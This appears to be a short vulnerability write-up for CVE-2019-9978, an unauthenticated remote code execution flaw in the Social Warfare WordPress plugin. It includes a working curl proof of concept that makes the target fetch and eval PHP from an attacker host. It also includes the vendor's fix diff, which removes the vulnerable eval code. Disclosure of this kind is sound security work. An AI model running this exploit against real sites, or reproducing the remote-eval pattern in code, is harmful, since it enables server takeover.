# CVE-2019-9978 - Social Warfare Wordpress plugin RCE < 3.5.3

> RCE on a Social Warfare Wordpress plugin without any prior authentication

### Proof Of Concept

```
curl http://127.0.0.1/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://172.18.0.1:1337/exploit.php
```

![capture d'écran_7](https://user-images.githubusercontent.com/5891788/54961378-b2661500-4f60-11e9-928c-e02d1558d34f.png)

**Vulnerable code**: 

![capture d'écran_6](https://user-images.githubusercontent.com/5891788/54961380-b42fd880-4f60-11e9-899a-1af9ce4b1a70.png)

---

Fix:
- https://github.com/warfare-plugins/social-warfare/commit/6295e4022de956e944fbf912c42f2ab20a6b28ff

```diff
From 6295e4022de956e944fbf912c42f2ab20a6b28ff Mon Sep 17 00:00:00 2001
From: Cortland Mahoney <cortland.mahoney@gmail.com>
Date: Thu, 21 Mar 2019 18:53:41 -0400
Subject: [PATCH] Removed deprecated query parameter.

---
 lib/utilities/SWP_Database_Migration.php | 65 ------------------------
 1 file changed, 65 deletions(-)

diff --git a/lib/utilities/SWP_Database_Migration.php b/lib/utilities/SWP_Database_Migration.php
index 7cec1a25..2865993c 100644
--- a/lib/utilities/SWP_Database_Migration.php
+++ b/lib/utilities/SWP_Database_Migration.php
@@ -218,71 +218,6 @@ public function debug_parameters() {
 		// }
 
 
-		/**
-		 * Migrates options from $_GET['swp_url'] to the current site.
-		 *
-		 * @since 3.4.2
-		 */
-		if ( true == SWP_Utility::debug('load_options') ) {
-			if (!is_admin()) {
-				wp_die('You do not have authorization to view this page.');
-			}
-
-			$options = file_get_contents($_GET['swp_url'] . '?swp_debug=get_user_options');
-
-			//* Bad url.
-			if (!$options) {
-				wp_die('nothing found');
-			}
-
-			$pre = strpos($options, '<pre>');
-			if ($pre != 0) {
-				wp_die('No Social Warfare found.');
-			}
-
-			$options = str_replace('<pre>', '', $options);
-			$cutoff = strpos($options, '</pre>');
-			$options = substr($options, 0, $cutoff);
-
-			$array = 'return ' . $options . ';';
-
-			try {
-				$fetched_options = eval( $array );
-			}
-			catch (ParseError $e) {
-				$message = 'Error evaluating fetched data. <br/>';
-				$message .= 'Message from error: ' . $e->getMessage() . '<br/>';
-				$message .= 'Fetched data: <br/>';
-				$message .= var_export($fetched_options, 1);
-				wp_die($message);
-			}
-
-			if (is_array( $fetched_options) ) {
-				foreach( $fetched_options as $key => $value) {
-					if (strpos( $key, 'license' ) > 0) {
-						unset( $fetched_options[$key] );
-					}
-					if (strpos( $key, 'token' ) > 0) {
-						unset( $fetched_options[$key] );
-					}
-					if (strpos( $key, 'login' ) > 0) {
-						unset( $fetched_options[$key] );
-					}
-				}
-				//* Preserve filtered data, such as license keys.
-				$new_options = array_merge( get_option('social_warfare_settings'), $fetched_options );
-
-				if (update_option( 'social_warfare_settings', $new_options )) {
-					wp_die('Social Warfare settings updated to match ' . $_GET['swp_url']);
-				}
-				else {
-					wp_die('Tried to update settings to match ' . $_GET['swp_url'] . ', but something went wrong or no options changed.');
-				}
-			}
-
-			wp_die('No changes made.');
-		}
-
 		if ( true === SWP_Utility::debug('get_filtered_options') ) :
 			global $swp_user_options;
 			echo "<pre>";
```



